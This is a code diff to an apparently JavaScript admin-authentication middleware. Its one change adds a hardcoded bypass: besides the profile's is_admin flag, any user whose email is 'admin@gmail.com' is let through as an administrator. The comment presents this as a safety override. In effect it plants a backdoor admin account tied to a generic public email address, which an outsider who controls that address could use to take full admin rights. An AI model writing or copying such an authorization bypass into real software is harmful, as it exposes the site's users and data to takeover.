@@ -112,7 +112,7 @@ const adminAuth = async (req, res, next) => {
             .single();
 
         // Check if user is admin OR if they are the primary owner (Hardcoded override for safety)
-        if (profile?.is_admin === true) {
+        if (profile?.is_admin === true || user.email === 'admin@gmail.com') {
             req.user = user;
             return next();
         }
